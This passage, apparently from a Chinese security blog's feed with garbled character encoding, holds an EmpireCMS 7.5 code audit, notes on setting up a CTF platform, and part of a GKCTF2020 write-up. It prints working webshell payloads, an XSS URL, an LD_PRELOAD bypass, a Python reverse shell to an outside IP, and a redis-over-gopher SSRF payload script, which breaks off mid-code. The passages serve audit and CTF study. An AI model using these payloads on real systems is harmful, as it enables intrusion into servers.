<p>EmpireCMS  7.5ç‰ˆæœ¬åŠä¹‹å‰ç‰ˆæœ¬åœ¨åå°å¤‡ä»½æ•°æ®åº“æ—¶,æœªå¯¹æ•°æ®åº“è¡¨ååšéªŒè¯,é€šè¿‡ä¿®æ”¹æ•°æ®åº“è¡¨åå¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚EmpireCMS7.5ç‰ˆæœ¬ä¸­çš„<code>/e/class/moddofun.php</code>çš„<code>LoadInMod</code>å‡½æ•°å­˜åœ¨å®‰å…¨æ¼æ´,æœªå¯¹å˜é‡<code>$file</code>åšä»»ä½•å¤„ç†ï¼Œç›´æ¥ä¸Šä¼ ï¼Œæ¥ç€å°±åŒ…å«è¯¥æ–‡ä»¶ã€‚</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20212415.png" alt="å±å¹•æˆªå›¾ 2021-03-17 212415">        </p>
<p>å¯¹æ­¤æˆ‘ä»¬ç›´æ¥å…¨å±€å¯»æ‰¾<code>LoadInMod</code>çš„è°ƒç”¨ï¼Œåœ¨<code>e/admin/ecmsmod.php</code></p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210317220115927.png" alt="image-20210317220115927"></p>
</li>
<li><p>æ¼æ´å¤ç°</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-17%20220503.png" alt="å±å¹•æˆªå›¾ 2021-03-17 220503">    </p>
<p>æ–°å»ºä¸€ä¸ª<code>1.mod</code>çš„æ–‡ä»¶ï¼Œå†…å®¹ä¸º</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">"../data/getshell.php"</span>,<span class="string">"&lt;?php @eval(\$_POST[a]); ?&gt;"</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ æˆåŠŸåï¼Œå³å¯å¾—åˆ°shell</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210317220729395.png" alt="image-20210317220729395"></p>
</li>
</ul>
<h3 id="åå°SQLæ‰§è¡Œgetshell"><a href="#åå°SQLæ‰§è¡Œgetshell" class="headerlink" title="åå°SQLæ‰§è¡Œgetshell"></a>åå°SQLæ‰§è¡Œgetshell</h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
<p>æ¼æ´ä½äº<code>e/admin/db/DoSql.php</code> 22è¡Œ<code>DoExecSql</code>æ–¹æ³•</p>
<p><code>$query</code>æœªç»è¿‡ä»»ä½•å¤„ç†å°±æ‰§è¡Œäº†</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20195309.png" alt="å±å¹•æˆªå›¾ 2021-03-18 195309"></p>
<p><code>ClearAddsData</code>æ–¹æ³•æ ¹æ®æ˜¯å¦å¼€å¯é­”æœ¯å¼•å·æ¥è½¬ä¹‰æ•°æ®ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸ç”¨ç®¡ã€‚è·Ÿè¿›<code>RepSqlTbpre</code>æ–¹æ³•ï¼Œåªåšäº†å‰ç¼€æ›¿æ¢ã€‚</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210318200030207.png" alt="image-20210318200030207"></p>
<p>ç»§ç»­è·Ÿè¿›<code>DoRunQuery</code>æ–¹æ³•ï¼Œæ›¿æ¢<code>\r</code>,æŒ‰<code>;</code>åˆ†å‰²è¯­å¥ï¼Œç„¶åå°±æ‰§è¡Œè¯­å¥ã€‚</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-18%20200132.png" alt="å±å¹•æˆªå›¾ 2021-03-18 200132"></p>
</li>
<li><p>æ¼æ´åˆ©ç”¨</p>
<p>å¯ä»¥åˆ©ç”¨SQLè¯­å¥å†™å…¥shellï¼Œä½†åˆ©ç”¨éš¾åº¦å¾ˆé«˜ã€‚</p>
<p>é¦–å…ˆéœ€è¦å¼€å¯mysqlçš„<code>secure_file_priv</code> é»˜è®¤æ˜¯å…³é—­çš„ï¼Œä¿®æ”¹my.confæ–‡ä»¶, åœ¨[mysqld] ä¸‹æ·»åŠ æ¡ç›®: <code>secure_file_priv =</code>,ä¿å­˜ä¹‹å,ç„¶åé‡å¯mysqlã€‚</p>
<p>ä¹‹åéœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210318211927366.png" alt="image-20210318211927366"></p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210318211959712.png" alt="image-20210318211959712"></p>
</li>
</ul>
<p>å¦‚æœæ˜¯ç«™åº“åˆ†ç¦»å½±å“å®åœ¨æœ‰é™ã€‚</p>
<h3 id="åå°XSS"><a href="#åå°XSS" class="headerlink" title="åå°XSS"></a>åå°XSS</h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
<p>é—®é¢˜å‡ºåœ¨<code>e/admin/openpage/AdminPage.php</code>ï¼Œè·å–<code>mainfile</code>ï¼Œ<code>leftfile</code>å˜é‡åï¼Œç»è¿‡<code>hRepPostStr</code>å¤„ç†åè¾“å‡ºåˆ°é¡µé¢</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210319094155021.png" alt="image-20210319094155021"></p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20182718.png" alt="å±å¹•æˆªå›¾ 2021-03-19 182718"></p>
<p>è·Ÿè¿›<code>hRepPostStr</code>æ–¹æ³•</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20094520.png" alt="å±å¹•æˆªå›¾ 2021-03-19 094520"></p>
<p>è·Ÿè¿›<code>ehtmlspecialchars</code>,ä»¥<code>ENT_QUOTES</code>æ¨¡å¼(æ—¢è½¬æ¢åŒå¼•å·ä¹Ÿè½¬æ¢å•å¼•å·)ï¼Œè½¬ä¹‰HTMLå®ä½“</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20181416.png" alt="å±å¹•æˆªå›¾ 2021-03-19 181416"></p>
<p>è·Ÿè¿›<code>CkPostStrChar</code>æ–¹æ³•ï¼Œç»“å°¾ä¸èƒ½ä¸º <code>\\</code>ã€‚</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210319181832873.png" alt="image-20210319181832873"></p>
<p>æœ€åè·Ÿè¿›<code>AddAddsData</code>æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰å¼€å¯<code>magic_quotes_gpc</code>å‡½æ•°,å°±ä½¿ç”¨<code>addslashes</code>å¯¹å‚æ•°ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰å¤„ç†</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210319182058498.png" alt="image-20210319182058498"></p>
</li>
<li><p>æ¼æ´åˆ©ç”¨</p>
<p>è®¿é—®<code>http://172.16.43.200:9093/e/admin/openpage/AdminPage.php?ehash_7NYw5=tJmMRJnmeKBHOPaBU04H&amp;mainfile=javascript:alert(document.cookie)</code></p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210319183728605.png" alt="image-20210319183728605"></p>
</li>
</ul>
<h3 id="åå°ä»»æ„ä»£ç æ‰§è¡Œ"><a href="#åå°ä»»æ„ä»£ç æ‰§è¡Œ" class="headerlink" title="åå°ä»»æ„ä»£ç æ‰§è¡Œ"></a>åå°ä»»æ„ä»£ç æ‰§è¡Œ</h3><ul>
<li><p>æ¼æ´åˆ†æ</p>
<p><code>e/admin/ebak/phome.php</code>æ¥æ”¶å¤‡ä»½æ•°æ®åº“ä¼ é€’çš„å‚æ•°,ç„¶åä¼ é€’ç»™<code>Ebak_DoEbak</code>æ–¹æ³•ä¸­</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210319201938388.png" alt="image-20210319201938388"></p>
<p>è·Ÿè¿›<code>Ebak_DoEbak</code>ï¼Œæ•°æ®åº“è¡¨åä¼ é€’ç»™å˜é‡<code>$tablename</code></p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20202302.png" alt="å±å¹•æˆªå›¾ 2021-03-19 202302"></p>
<p>å†ç»è¿‡<code>RepPostVar</code>å¤„ç†ï¼Œæ›¿æ¢ç‰¹æ®Šå­—ç¬¦ï¼Œè½¬ä¹‰ï¼Œé˜²ç«å¢™è¿‡æ»¤(é»˜è®¤ä¸Šæ²¡æœ‰è¿‡æ»¤å­—ç¬¦)</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210319203747991.png" alt="image-20210319203747991"></p>
<p>ç»è¿‡å­—ç¬¦æ‹¼æ¥èµ‹å€¼ç»™<code>$d_table</code>ï¼Œå†æ‹¼æ¥è¿›<code>$string</code>æœ€åå†™å…¥phpæ–‡ä»¶ã€‚</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20204115.png" alt="å±å¹•æˆªå›¾ 2021-03-19 204115"></p>
</li>
<li><p>æ¼æ´åˆ©ç”¨</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20204313.png" alt="å±å¹•æˆªå›¾ 2021-03-19 204313"></p>
<p>æŠ“åŒ…ä¿®æ”¹<code>tablename</code>å­—æ®µ</p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-03-19%20204718.png" alt="å±å¹•æˆªå›¾ 2021-03-19 204718"></p>
<p>è®¿é—®<code>config.php</code></p>
<p><img src="/2021/03/EmpireCMSv7-5ä»£ç å®¡è®¡/image-20210319204854229.png" alt="image-20210319204854229"></p>
</li>
</ul>
<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://www.cnblogs.com/LEOGG321/p/13882655.html" target="_blank" rel="noopener">https://www.cnblogs.com/LEOGG321/p/13882655.html</a></p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>H1veæ­å»ºé—®é¢˜</title>
    <url>/2021/01/H1ve%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-æ‰¾ä¸åˆ°PWD"><a href="#1-æ‰¾ä¸åˆ°PWD" class="headerlink" title="1.æ‰¾ä¸åˆ°PWD"></a>1.æ‰¾ä¸åˆ°PWD</h3><p><img src="/2021/01/H1veæ­å»ºé—®é¢˜/image-20210107150823208.png" alt="image-20210107150823208"></p><p>H1veçš„ç‰ˆæœ¬æ˜¯1.1.3</p><p>ä½¿ç”¨</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">docker-compose</span> <span class="selector-tag">-f</span> <span class="selector-tag">single</span><span class="selector-class">.yml</span> <span class="selector-tag">up</span></span><br></pre></td></tr></table></figure><p><img src="/2021/01/H1veæ­å»ºé—®é¢˜/image-20210107151152146.png" alt="image-20210107151152146"></p><p>è¿™é‡Œè­¦å‘ŠPWDæœªå®šä¹‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨é¡¹ç›®ä¸‹åˆ›å»º<code>.env</code>å®šä¹‰ä¸€ä¸‹å°±è¡Œ</p><p><img src="/2021/01/H1veæ­å»ºé—®é¢˜/image-20210107151304373.png" alt="image-20210107151304373"></p><h3 id="2-è®¿é—®è¿‡æ…¢"><a href="#2-è®¿é—®è¿‡æ…¢" class="headerlink" title="2.è®¿é—®è¿‡æ…¢"></a>2.è®¿é—®è¿‡æ…¢</h3><p>è¿™ä¸ªé—®é¢˜å…¶å®æ˜¯ä¸ªcssæ–‡ä»¶å¼•èµ·çš„ï¼Œå¼•ç”¨çš„è¿™ä¸ªcssæ–‡ä»¶çš„åŸŸåè¢«å¢™äº† - -ï¼</p><p>å¯¼è‡´è¿™ä¸ªé—®é¢˜åé¢å¶ç„¶æ‰å‘ç°çš„</p><p><img src="/2021/01/H1veæ­å»ºé—®é¢˜/image-20210107153325242.png" alt="image-20210107153325242"></p><p>æˆ‘çš„è§£å†³åŠæ³•æ˜¯æŠŠ<code>all.css</code>ä¸‹è½½ä¸‹æ¥æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼Œå†ä¿®æ”¹å¼•ç”¨çš„URL</p><a id="more"></a>











<p><img src="/2021/01/H1veæ­å»ºé—®é¢˜/image-20210107153828399.png" alt="image-20210107153828399"></p>
<p>ç„¶åä¿®æ”¹fontawesome-fonts.css </p>
<p><img src="/2021/01/H1veæ­å»ºé—®é¢˜/image-20210107154100385.png" alt="image-20210107154100385"></p>
<p><img src="/2021/01/H1veæ­å»ºé—®é¢˜/image-20210107154343809.png" alt="image-20210107154343809"></p>
<h3 id="3-redisç¼“å­˜ä¸é‡Šæ”¾ï¼Œé¡µé¢500"><a href="#3-redisç¼“å­˜ä¸é‡Šæ”¾ï¼Œé¡µé¢500" class="headerlink" title="3.redisç¼“å­˜ä¸é‡Šæ”¾ï¼Œé¡µé¢500"></a>3.redisç¼“å­˜ä¸é‡Šæ”¾ï¼Œé¡µé¢500</h3><p>è¿™ä¸ªbugå®˜æ–¹è¿˜æ²¡ä¿®å¤ï¼Œæ‰€ä»¥åªèƒ½è‡ªå·±ä¿®å¤</p>
<p>åˆ©ç”¨è¿™ä¸ªå·¥å…·æ¸…ç†è¿‡æœŸçš„redisç¼“å­˜<a href="https://github.com/emacsist/redis-con-release" target="_blank" rel="noopener">https://github.com/emacsist/redis-con-release</a></p>
<p>ä½†æ˜¯è¿™ä¸ªå·¥å…·æ˜¯ä¸€å¤©æ¸…é™¤ä¸€æ¬¡ï¼Œæœ¬æ¥æƒ³é‡å†™buildçš„ï¼Œä½†æ˜¯æœ‰äº›åŒ…ä¸¢å¤±äº†</p>
<p>æ‰€ä»¥å°±å†™äº†ä¸ªè„šæœ¬</p>
<p>kill.sh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        <span class="built_in">cd</span> / &amp;&amp; timeout 5 ./app-linux-amd64 &amp;&amp; sleep 600</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>è·å–å®¹å™¨id</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">sudo docker container <span class="keyword">ps</span> |<span class="keyword">grep</span> redis</span><br></pre></td></tr></table></figure>

<p><img src="/2021/01/H1veæ­å»ºé—®é¢˜/image-20210107155615543.png" alt="image-20210107155615543"></p>
<p>æŠŠå·¥å…·ã€è„šæœ¬å¤åˆ¶åˆ°å®¹å™¨</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">sudo docker <span class="keyword">cp</span> ./app-linux-amd64   <span class="number">1</span>dc:/</span><br><span class="line">sudo docker <span class="keyword">cp</span> ./app.json  <span class="number">1</span>dc:/</span><br><span class="line">sudo docker <span class="keyword">cp</span> ./kill.<span class="keyword">sh</span>   <span class="number">1</span>dc:/</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥å®¹å™¨ï¼Œæ‰§è¡Œè„šæœ¬</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it 1dc  <span class="string">/bin/bash</span></span><br><span class="line"><span class="keyword">cd</span> /</span><br><span class="line">nohup <span class="string">./kill.sh</span> &amp;</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶è„šæœ¬ä¹Ÿå¯ä»¥æ ¹æ®éœ€æ±‚ä¿®æ”¹</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTFå¹³å°</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF2020-WP</title>
    <url>/2020/05/GKCTF2020-Writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Check-IN"><a href="#1-Check-IN" class="headerlink" title="1.Check IN"></a>1.Check IN</h3><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524132441686.png" alt="image-20200524132441686"></p><p>è¿›å»å°±æ˜¯ä¸€ä¸ªé©¬</p><p>æ‰§è¡Œphpinfoåå‘ç°ï¼Œç¦ç”¨äº†æ‰§è¡Œå‘½ä»¤çš„ç³»ç»Ÿå‡½æ•°ï¼Œä½†putenvæœªè¢«ç¦ç”¨ï¼Œæ‰€ä»¥æƒ³åˆ°åŠ«æŒåŠ¨æ€åº“æ‰§è¡Œå‘½ä»¤ã€‚</p><p>å…ˆç”¨èšå‰‘è¿æ¥</p><p>æ„é€ å¦‚ä¸‹URLï¼Œ<a href="http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==å¯†ç æ˜¯a" target="_blank" rel="noopener">http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==å¯†ç æ˜¯a</a></p><a id="more"></a>




<p>æˆ–è€…ä¿®æ”¹ç¼–ç å™¨</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524133145293.png" alt="image-20200524133145293"></p>
<p>ä¸Šä¼ æ¶æ„<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">soæ–‡ä»¶å’Œbypass.php</a>æ¥ç€è¯»flag</p>
<p><code>http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9HRVRbJ2EnXSk7Cg==&amp;a=include(%27/var/tmp/1.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/var/tmp/1.so</code></p>
<h3 id="2-è€å…«å°è¶…å¸‚å„¿"><a href="#2-è€å…«å°è¶…å¸‚å„¿" class="headerlink" title="2.è€å…«å°è¶…å¸‚å„¿"></a>2.è€å…«å°è¶…å¸‚å„¿</h3><p>ç”¨çš„æ˜¯shopxoæ¨¡æ¿ï¼Œè¿™é‡Œæœ‰ä¸ªåå°Getshellçš„æ¼æ´ã€‚å…·ä½“çœ‹è¿™ç¯‡<a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">æ–‡ç« </a></p>
<p>æ‹¿åˆ°shellç”¨èšå‰‘è¿</p>
<p><a href="http://20e6504f-9a68-4272-b02b-4de366165b48.node3.buuoj.cn/public/static/index/default/1.php" target="_blank" rel="noopener">http://20e6504f-9a68-4272-b02b-4de366165b48.node3.buuoj.cn/public/static/index/default/1.php</a></p>
<p>ç„¶åå‘ç°æ ¹ç›®å½•ä¸‹æœ‰flag</p>
<p>å‘Šè¯‰æˆ‘ä»¬flagåœ¨æ ¹ç›®å½•</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145719302.png" alt="image-20200524145719302"></p>
<p>flag.hintæœ‰ç‚¹å¥‡æ€ª</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145846453.png" alt="image-20200524145846453"></p>
<p>ç›´åˆ°çœ‹åˆ°auto.shï¼ŒåŸæ¥æ˜¯ä¸ªå®šæ—¶ä»»åŠ¡</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145602985.png" alt="image-20200524145602985"></p>
<p>æ¥ç€ä¿®æ”¹makeflaghint.pyéå†/root/</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path_list = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all</span><span class="params">(path)</span>:</span></span><br><span class="line">    paths = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> paths:</span><br><span class="line">        com_path = os.path.join(path,i)</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(com_path):</span><br><span class="line">            get_all(com_path)</span><br><span class="line">        <span class="keyword">elif</span> os.path.isfile(com_path):</span><br><span class="line">            path_list.append(com_path)</span><br><span class="line">        <span class="keyword">with</span>  open(<span class="string">'/flag.hint'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(com_path+<span class="string">'\n'</span>)</span><br><span class="line">        print(com_path) </span><br><span class="line">get_all(path=<span class="string">r'/root'</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/GKCTF2020-Writeup/20232423444217.png" alt="20232423444217"></p>
<p>å‘ç°flagæ¥ç€è¯»å–å°±è¡Œ</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">f1=<span class="built_in">open</span>(<span class="string">"/root/flag"</span>)</span><br><span class="line">aaa=f1.<span class="built_in">read</span>()</span><br><span class="line">f1.<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">with</span>  <span class="built_in">open</span>(<span class="string">'/flag.hint'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.<span class="built_in">write</span>(aaa+<span class="string">'\n'</span>)</span><br><span class="line">print(<span class="string">"D"</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145546293.png" alt="image-20200524145546293"></p>
<p>åé¢çœ‹å®˜æ–¹WPæ˜¯åå¼¹shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"174.1.118.22"</span>,<span class="number">2333</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>

<h3 id="3-CVEç‰ˆç­¾åˆ°"><a href="#3-CVEç‰ˆç­¾åˆ°" class="headerlink" title="3.CVEç‰ˆç­¾åˆ°"></a>3.CVEç‰ˆç­¾åˆ°</h3><p>å¼€å§‹æ²¡çœ‹æ‡‚è¿™é¢˜åœ¨å¹²å•¥ï¼Œåé¢æç¤º<a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener">CVE-2020-7066</a> getheadå‡½æ•°å­˜åœ¨%00æˆªæ–­</p>
<p>å°±è¯•äº†æ–‡ç« é‡Œçš„Payloadå‘ç°å•¥ä¹Ÿæ²¡æœ‰ã€‚ç›´åˆ°çœ‹äº†WPæ‰å‘ç°åŸæ¥éƒ½æ˜¯Burpçš„é”…</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105018707.png" alt="image-20200525105018707"></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105045473.png" alt="image-20200525105045473"></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105141216.png" alt="image-20200525105141216"></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105212253.png" alt="image-20200525105212253"></p>
<p>è¿™é¢˜ç¡®å®ç­¾åˆ°(æ”¾äº†æç¤º)ï¼Œæ„Ÿè§‰ä¸»è¦è€ƒå¯¹æœ€æ–°ä¸€äº›çš„CVEçš„äº†è§£ã€‚åå®æˆ˜ï¼Œçˆ±äº†çˆ±äº†ã€‚</p>
<h3 id="4-EZä¸‰å‰‘å®¢-EzWeb"><a href="#4-EZä¸‰å‰‘å®¢-EzWeb" class="headerlink" title="4.EZä¸‰å‰‘å®¢-EzWeb"></a>4.EZä¸‰å‰‘å®¢-EzWeb</h3><p>è¿™é¢˜SSRF+redisæœªæˆæƒï¼Œä½†æ˜¯shellæ­»æ´»æ”¶ä¸åˆ°ã€‚åé¢çœ‹WPå‘ç°æ˜¯ç‹¬ç«‹äºå•å®¹å™¨çš„å†…ç½‘ï¼Œå†…ç½‘é¶æœºæ”¶ä¸åˆ°åå¼¹shellã€‚æ‰€ä»¥æ˜¯ç›´æ¥å†™webshellã€‚</p>
<p>å¼€å±€å°±å«ä½ è¾“å…¥URLï¼Œå…«æˆæ˜¯ä¸ªSSRFï¼Œå°±éšæ„è¾“å…¥äº†127.0.0.1ï¼Œå‘ç°è¢«ç¦äº†ã€‚ç„¶åå°±æƒ³ç€æ€ä¹ˆç»•(åé¢å‘ç°ä¸ç”¨ã€‚ã€‚ã€‚)</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525110646995.png" alt="image-20200525110646995"></p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525110728289.png" alt="image-20200525110728289"></p>
<p>å‘ç°<code>0x7f000001</code> å¯ä»¥ç»•è¿‡ã€‚åé¢ç”¨BurpæŠ“åŒ…ï¼Œæƒ³æ‰«æä¸‹æœ¬æœºç«¯å£ï¼Œçœ‹åˆ°æ‰çœ‹åˆ°secretè¿™ä¸ªå‚æ•°</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525111239096.png" alt="image-20200525111239096"></p>
<p>å¾—åˆ°äº†æœ¬æœºçš„å†…ç½‘IP</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525111352798.png" alt="image-20200525111352798"></p>
<p>è¿™æ ·ä¸€çœ‹è‚¯å®šå°±ä¸æ˜¯æœ¬æœºçš„ç«¯å£æ¸—é€ï¼Œåº”è¯¥åœ¨å†…ç½‘çš„å…¶ä»–æœºå™¨ä¸Šï¼Œç„¶åå†…ç½‘æ¢æµ‹ï¼Œå¾ˆæ˜æ˜¾çš„æç¤ºäº†</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525112129001.png" alt="image-20200525112129001"></p>
<p>ç„¶åå°±éšæ„æµ‹äº†ä¸‹6379ç«¯å£ï¼Œå‘ç°æœ‰æˆ</p>
<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525112303602.png" alt="image-20200525112303602"></p>
<p>ç›´æ¥ç”¨è„šæœ¬ç”Ÿæˆpayload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/usr/bin/python3<span class="number">.8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.31.59.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET['a']);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"1.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x 